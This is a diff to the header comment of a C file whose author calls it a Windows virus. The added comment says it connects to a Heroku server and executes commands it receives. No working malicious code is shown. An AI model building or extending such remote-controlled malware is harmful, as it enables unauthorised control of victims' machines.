@@ -1,10 +1,10 @@
 /*
 
-	Ron Elmekiesse, 25.9.2020
+	Ron Elmekiesse, 29.9.2020
 	This is my Windows Virus code (:
+	This Virus connect to the heroku server and then communicates with him and asks and implementing the commands given!
 
 */
-
 
 
 #include "utilities.h"
